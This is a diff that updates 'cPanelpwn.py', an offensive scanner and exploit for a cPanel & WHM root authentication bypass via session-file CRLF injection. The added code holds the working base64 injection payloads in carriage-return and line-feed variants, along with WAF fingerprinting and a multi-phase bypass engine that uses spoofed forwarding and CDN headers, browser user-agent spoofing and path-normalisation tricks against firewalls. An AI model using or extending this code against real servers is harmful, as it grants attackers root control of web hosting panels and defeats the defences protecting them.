@@ -3,7 +3,7 @@
 """
 cPanelpwn.py — CVE-2026-41940 cPanel & WHM Auth Bypass Scanner
 Author  : cPanelpwn
-Version : 2.0
+Version : 2.1
 
 CVE-2026-41940: Session-File CRLF Injection → WHM Root Authentication Bypass
   saveSession() calls filter_sessiondata() AFTER writing the session file.
@@ -33,7 +33,7 @@ Subdomain Discovery (--domain):
   Source 2 — DNS brute-force: ~200 WHM-focused prefixes resolved via socket
   Filter   — Probes ports [2087, 2083, 2086, 2082]; keeps first live WHM URL
 
-New Features (v2.0):
+New in v2.0:
   --check           → Passive version check only, no exploit
   --session/--token → Reuse existing session, skip stages 0-3
   --exclude         → File of hosts to skip
@@ -42,6 +42,14 @@ New Features (v2.0):
   -o results.html   → Dark-theme HTML report with finding cards
   -l nmap.xml       → Auto-detect nmap XML / masscan JSON / Shodan NDJSON / plain text
   WAF detection     → Warns before exploit if Cloudflare/Sucuri/Incapsula/etc. detected
+
+New in v2.1 — Extended bypass engine (22 WAFs, 4 bypass phases):
+  WAFs added        → CloudFront, BunnyCDN, StackPath, Edgio (now 22 total)
+  New generic techs → HTTP verb override, Content-Type GET bypass,
+                      Chrome UA spoof, Firefox UA spoof (now 13 header techniques)
+  Phase 2 (NEW)     → Path normalisation: //, /./,  /%2F, /login/../, /;/, /../
+  Phase 3 (NEW)     → Alternate CRLF payloads: bare-CR (\\r), LF-only (\\n), CR+shotgun
+  Bypass agent now runs 4 phases before declaring WAF unbypassable
 
 Affected  : cPanel & WHM < 11.110.0.97 / 11.118.0.63 / 11.126.0.54 /
                            11.132.0.29 / 11.134.0.20 / 11.136.0.5
@@ -178,6 +186,16 @@ class ScanCtx(NamedTuple):
 PAYLOAD_B64 = (
     "cm9vdDp4DQpzdWNjZXNzZnVsX2ludGVybmFsX2F1dGhfd2l0aF90aW1lc3RhbXA9OTk5"
     "OTk5OTk5OQ0KdXNlcj1yb290DQp0ZmFfdmVyaWZpZWQ9MQ0KaGFzcm9vdD0x"
+)
+# Bare-CR variant (\r only — accepted by some cpsrvd versions / confuses WAF signatures)
+PAYLOAD_B64_CR = (
+    "cm9vdDp4DXN1Y2Nlc3NmdWxfaW50ZXJuYWxfYXV0aF93aXRoX3RpbWVzdGFtcD05OTk5"
+    "OTk5OTk5DXVzZXI9cm9vdA10ZmFfdmVyaWZpZWQ9MQ1oYXNyb290PTE="
+)
+# LF-only variant (\n only — some proxies strip \r before forwarding)
+PAYLOAD_B64_LF = (
+    "cm9vdDp4CnN1Y2Nlc3NmdWxfaW50ZXJuYWxfYXV0aF93aXRoX3RpbWVzdGFtcD05OTk5"
+    "OTk5OTk5CnVzZXI9cm9vdAp0ZmFfdmVyaWZpZWQ9MQpoYXNyb290PTE="
 )
 
 # (patched_patch, patched_build) — minimum build in that branch that is fixed
@@ -404,6 +422,19 @@ WAF_SIGNATURES: Dict[str, callable] = {
     "NAXSI":       lambda r: "x-data-origin" in r.headers and (
                               r.status == 403 and "naxsi" in (r.body or "").lower()),
     "DenyAll":     lambda r: "x-denyall" in r.headers,
+    # ── New WAFs ─────────────────────────────────────────────────
+    "CloudFront":  lambda r: ("x-amz-cf-id"  in r.headers
+                              or "x-amz-cf-pop" in r.headers),
+    "BunnyCDN":    lambda r: ("bunnycdn-request-id" in r.headers
+                              or "x-bunny-cached" in r.raw_cookies.lower()
+                              or "bunny" in r.headers.get("server","").lower()),
+    "StackPath":   lambda r: ("x-hw"     in r.headers
+                              or "x-sp-pop" in r.headers
+                              or "stackpath" in r.headers.get("server","").lower()),
+    "Edgio":       lambda r: ("x-ec-custom-error" in r.headers
+                              or "x-bap-bc"        in r.headers
+                              or "edgio"      in r.headers.get("server","").lower()
+                              or "limelight"  in r.headers.get("via",   "").lower()),
 }
 
 def detect_waf(scheme: str, host: str, port: int, timeout: int) -> Optional[str]:
@@ -580,6 +611,41 @@ WAF_BYPASS: Dict[str, dict] = {
         },
         "delay": 0.3,
     },
+    # ── New WAF profiles ─────────────────────────────────────────
+    "CloudFront": {
+        "headers": {
+            "X-Forwarded-For":                "127.0.0.1",
+            "X-Real-IP":                      "127.0.0.1",
+            "CloudFront-Is-Desktop-Viewer":   "true",
+            "CloudFront-Forwarded-Proto":     "https",
+            "CloudFront-Viewer-Country":      "US",
+        },
+        "delay": 0.5,
+    },
+    "BunnyCDN": {
+        "headers": {
+            "X-Forwarded-For":  "127.0.0.1",
+            "X-Real-IP":        "127.0.0.1",
+            "CDN-Loop":         "BunnyCDN",
+        },
+        "delay": 0.3,
+    },
+    "StackPath": {
+        "headers": {
+            "X-Forwarded-For":    "127.0.0.1",
+            "X-Real-IP":          "127.0.0.1",
+            "X-SP-Forwarded-For": "127.0.0.1",
+        },
+        "delay": 0.3,
+    },
+    "Edgio": {
+        "headers": {
+            "X-Forwarded-For":  "127.0.0.1",
+            "X-Real-IP":        "127.0.0.1",
+            "X-EC-Debug":       "x-ec-cache,x-ec-check-cacheable,x-ec-cache-key",
+        },
+        "delay": 0.5,
+    },
 }
 
 def get_bypass_headers(waf: Optional[str]) -> dict:
@@ -706,6 +772,55 @@ _GENERIC_FALLBACKS: List[dict] = [
         },
         "delay": 1.0,
     },
+    # ── New generic bypass techniques ────────────────────────────
+    {
+        "name": "HTTP verb override",
+        "headers": {
+            "X-Forwarded-For":        "127.0.0.1",
+            "X-Real-IP":              "127.0.0.1",
+            "X-HTTP-Method-Override": "GET",
+            "X-Method-Override":      "GET",
+            "X-Original-Method":      "GET",
+        },
+        "delay": 0.5,
+    },
+    {
+        "name": "Content-Type GET bypass",
+        "headers": {
+            "X-Forwarded-For":  "127.0.0.1",
+            "X-Real-IP":        "127.0.0.1",
+            "Content-Type":     "application/x-www-form-urlencoded",
+            "Content-Length":   "0",
+        },
+        "delay": 0.5,
+    },
+    {
+        "name": "Chrome UA spoof",
+        "headers": {
+            "X-Forwarded-For": "127.0.0.1",
+            "X-Real-IP":       "127.0.0.1",
+            "User-Agent":      ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+                                "AppleWebKit/537.36 (KHTML, like Gecko) "
+                                "Chrome/124.0.0.0 Safari/537.36"),
+            "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Referer":         "https://www.google.com/",
+        },
+        "delay": 0.5,
+    },
+    {
+        "name": "Firefox UA spoof",
+        "headers": {
+            "X-Forwarded-For": "127.0.0.1",
+            "X-Real-IP":       "127.0.0.1",
+            "User-Agent":      ("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) "
+                                "Gecko/20100101 Firefox/125.0"),
+            "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Accept-Encoding": "gzip, deflate, br",
+        },
+        "delay": 0.5,
+    },
 ]
 
 # Per-WAF extra fallbacks appended after the generic list
@@ -777,6 +892,65 @@ _WAF_EXTRA_FALLBACKS: Dict[str, List[dict]] = {
             "delay": 0.5,
         },
     ],
+    "CloudFront": [
+        {
+            "name": "CloudFront viewer-country spoof",
+            "headers": {
+                "X-Forwarded-For":              "127.0.0.1",
+                "CloudFront-Is-Mobile-Viewer":  "false",
+                "CloudFront-Is-Tablet-Viewer":  "false",
+                "CloudFront-Viewer-Country":    "US",
+                "CloudFront-Forwarded-Proto":   "https",
+            },
+            "delay": 0.8,
+        },
+        {
+            "name": "CloudFront origin-spoof",
+            "headers": {
+                "X-Forwarded-For":  "127.0.0.1",
+                "X-Real-IP":        "127.0.0.1",
+                "Via":              "1.1 cloudfront.net (CloudFront)",
+                "X-Amz-Cf-Id":     "fake-cf-id-bypass",
+            },
+            "delay": 1.0,
+        },
+    ],
+    "BunnyCDN": [
+        {
+            "name": "BunnyCDN internal edge",
+            "headers": {
+                "X-Forwarded-For":    "127.0.0.1",
+                "X-Real-IP":          "127.0.0.1",
+                "CDN-Loop":           "BunnyCDN",
+                "X-Bunny-Forwarded":  "for=127.0.0.1",
+            },
+            "delay": 0.5,
+        },
+    ],
+    "StackPath": [
+        {
+            "name": "StackPath edge-node spoof",
+            "headers": {
+                "X-Forwarded-For":     "127.0.0.1",
+                "X-SP-Forwarded-For":  "127.0.0.1",
+                "X-HW":                "1",
+                "X-Real-IP":           "127.0.0.1",
+            },
+            "delay": 0.5,
+        },
+    ],
+    "Edgio": [
+        {
+            "name": "Edgio POP spoof",
+            "headers": {
+                "X-Forwarded-For":  "127.0.0.1",
+                "X-Real-IP":        "127.0.0.1",
+                "X-EC-Debug":       "x-ec-cache",
+                "Via":              "1.1 edgio.net",
+            },
+            "delay": 0.8,
+        },
+    ],
     "Fastly": [
         {
             "name": "Fastly client-IP spoof",
@@ -790,6 +964,83 @@ _WAF_EXTRA_FALLBACKS: Dict[str, List[dict]] = {
         },
     ],
 }
+
+# ══════════════════════════════════════════════════════════════
+#  PATH NORMALIZATION BYPASS PROFILES
+# ══════════════════════════════════════════════════════════════
+# WAFs match on the literal URI path; cpsrvd normalises it server-side.
+# Each profile carries a "path" key consumed by stage2_inject.
+_PATH_FALLBACKS: List[dict] = [
+    {
+        "name":    "Path double-slash",
+        "path":    "//",
+        "headers": {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"},
+        "delay":   0.5,
+    },
+    {
+        "name":    "Path dot-slash",
+        "path":    "/./",
+        "headers": {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"},
+        "delay":   0.5,
+    },
+    {
+        "name":    "Path URL-encoded slash",
+        "path":    "/%2F",
+        "headers": {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"},
+        "delay":   0.5,
+    },
+    {
+        "name":    "Path traversal",
+        "path":    "/login/../",
+        "headers": {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"},
+        "delay":   0.5,
+    },
+    {
+        "name":    "Path semicolon separator",
+        "path":    "/;/",
+        "headers": {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"},
+        "delay":   0.5,
+    },
+    {
+        "name":    "Path double dot-slash",
+        "path":    "/../",
+        "headers": {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"},
+        "delay":   0.5,
+    },
+]
+
+# ══════════════════════════════════════════════════════════════
+#  ALTERNATIVE CRLF PAYLOAD PROFILES
+# ══════════════════════════════════════════════════════════════
+# Different line-ending variants bypass WAF signature detection on
+# the Authorization: Basic header value.
+_PAYLOAD_FALLBACKS: List[dict] = [
+    {
+        "name":    "Bare-CR payload (\\r only)",
+        "payload": PAYLOAD_B64_CR,
+        "headers": {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"},
+        "delay":   0.5,
+    },
+    {
+        "name":    "LF-only payload (\\n only)",
+        "payload": PAYLOAD_B64_LF,
+        "headers": {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"},
+        "delay":   0.5,
+    },
+    {
+        "name":    "Bare-CR payload + shotgun headers",
+        "payload": PAYLOAD_B64_CR,
+        "headers": {
+            "X-Forwarded-For":           "127.0.0.1",
+            "X-Real-IP":                 "127.0.0.1",
+            "X-Originating-IP":          "127.0.0.1",
+            "CF-Connecting-IP":          "127.0.0.1",
+            "True-Client-IP":            "127.0.0.1",
+            "Forwarded":                 "for=127.0.0.1;proto=https",
+        },
+        "delay":   0.8,
+    },
+]
 
 # Public sources queried for live bypass research
 _BYPASS_RESEARCH_SOURCES: List[tuple] = [
@@ -902,9 +1153,11 @@ def waf_bypass_agent(waf: str,
     Full bypass retry loop. Called when stage2 fails with a WAF present.
 
     Execution order:
-      1. Generic fallback profiles (9 techniques, no network)
+      1. Generic header fallbacks (13 techniques, no network)
       2. WAF-specific extra profiles (in parallel with internet research)
-      3. Internet-researched profiles (fetched from public sources)
+      3. Path normalisation fallbacks (6 URI variants)
+      4. Alternate CRLF payload fallbacks (3 variants: bare-CR, LF-only, CR+shotgun)
+      5. Internet-researched profiles (fetched from public sources in background)
 
     Returns the /cpsess token on first successful bypass, or None if all
     techniques are exhausted.
@@ -913,10 +1166,13 @@ def waf_bypass_agent(waf: str,
     waf_extra  = _WAF_EXTRA_FALLBACKS.get(waf, [])
     local_all  = generic + waf_extra
     total_local = len(local_all)
+    total_path    = len(_PATH_FALLBACKS)
+    total_payload = len(_PAYLOAD_FALLBACKS)
 
     log("WARN",
-        f"[bypass-agent] Primary bypass failed — trying {total_local} "
-        f"local techniques + live internet research", f"{host}:{port}")
+        f"[bypass-agent] Primary bypass failed — trying {total_local} header "
+        f"+ {total_path} path + {total_payload} payload techniques "
+        f"+ live internet research", f"{host}:{port}")
 
     # Start internet research in background thread
     researched: list = []
@@ -932,25 +1188,48 @@ def waf_bypass_agent(waf: str,
 
     threading.Thread(target=_research, daemon=True, name="waf-research").start()
 
-    # Try all local techniques
-    for i, profile in enumerate(local_all, 1):
-        name  = profile.get("name", f"profile-{i}")
-        hdrs  = profile.get("headers", {})
-        delay = profile.get("delay", 0.5)
-
-        log("INFO",
-            f"[bypass-agent] [{i}/{total_local}] {C.CYAN}{name}{C.RESET}")
+    def _try_profile(profile: dict, label: str) -> Optional[str]:
+        name    = profile.get("name", label)
+        hdrs    = profile.get("headers", {})
+        delay   = profile.get("delay", 0.5)
+        path    = profile.get("path",    "/")
+        payload = profile.get("payload", None)
+        log("INFO", f"[bypass-agent] {C.CYAN}{name}{C.RESET}")
         time.sleep(delay)
+        return stage2_inject(scheme, host, port, canonical,
+                             session_base, timeout,
+                             waf_hdrs=hdrs, path=path, payload_b64=payload)
 
-        token = stage2_inject(scheme, host, port, canonical,
-                              session_base, timeout, waf_hdrs=hdrs)
+    # Phase 1 — header-based techniques
+    for i, profile in enumerate(local_all, 1):
+        token = _try_profile(profile, f"header-profile-{i}")
         if token:
             log("OK",
                 f"[bypass-agent] {C.GREEN}Bypass successful!{C.RESET} "
-                f"technique: {name}")
+                f"technique: {profile.get('name', f'header-{i}')}")
             return token
 
-    # Wait up to 25 s for internet research to finish
+    # Phase 2 — path normalisation techniques
+    log("INFO", f"[bypass-agent] Switching to path-normalisation techniques...")
+    for i, profile in enumerate(_PATH_FALLBACKS, 1):
+        token = _try_profile(profile, f"path-{i}")
+        if token:
+            log("OK",
+                f"[bypass-agent] {C.GREEN}Bypass via path normalisation!{C.RESET} "
+                f"path: {profile.get('path')}")
+            return token
+
+    # Phase 3 — alternate CRLF payload techniques
+    log("INFO", f"[bypass-agent] Switching to alternate payload techniques...")
+    for i, profile in enumerate(_PAYLOAD_FALLBACKS, 1):
+        token = _try_profile(profile, f"payload-{i}")
+        if token:
+            log("OK",
+                f"[bypass-agent] {C.GREEN}Bypass via alternate payload!{C.RESET} "
+                f"technique: {profile.get('name')}")
+            return token
+
+    # Phase 4 — wait for internet research then try results
     research_done.wait(timeout=25)
 
     if researched:
@@ -968,9 +1247,10 @@ def waf_bypass_agent(waf: str,
                     f"[bypass-agent] {C.GREEN}Bypass via internet-researched technique!{C.RESET}")
                 return token
 
+    total_tried = total_local + total_path + total_payload + len(researched)
     log("WARN",
-        f"[bypass-agent] All {total_local + len(researched)} technique(s) "
-        f"exhausted — WAF held", f"{host}:{port}")
+        f"[bypass-agent] All {total_tried} technique(s) exhausted — WAF held",
+        f"{host}:{port}")
     return None
 
 # ══════════════════════════════════════════════════════════════
@@ -1401,13 +1681,20 @@ def stage1_preauth(scheme, host, port, canonical, timeout,
 #  STAGE 2 — CRLF injection
 # ══════════════════════════════════════════════════════════════
 def stage2_inject(scheme, host, port, canonical, session_base, timeout,
-                  waf_hdrs: Optional[dict] = None) -> Optional[str]:
-    """GET / with CRLF-poisoned Authorization: Basic → session file poisoned."""
+                  waf_hdrs: Optional[dict] = None,
+                  path: str = "/",
+                  payload_b64: Optional[str] = None) -> Optional[str]:
+    """GET <path> with CRLF-poisoned Authorization: Basic → session file poisoned.
+
+    path        — URI to request; cpsrvd normalises it, WAFs match literally.
+    payload_b64 — override the default CRLF payload (bare-CR / LF variants).
+    """
     cookie_enc = quote(session_base)
-    url  = build_url(scheme, host, port, "/")
-    # Bypass headers injected first; Authorization + Cookie always override them
+    url  = build_url(scheme, host, port, path)
+    pb64 = payload_b64 or PAYLOAD_B64
+    # Bypass headers first; Authorization + Cookie always override them
     hdrs = {**(waf_hdrs or {}),
-            "Authorization": f"Basic {PAYLOAD_B64}",
+            "Authorization": f"Basic {pb64}",
             "Cookie":        f"whostmgrsession={cookie_enc}"}
     resp = _do(url, method="GET", extra_headers=hdrs,
                timeout=timeout, canonical_host=canonical)
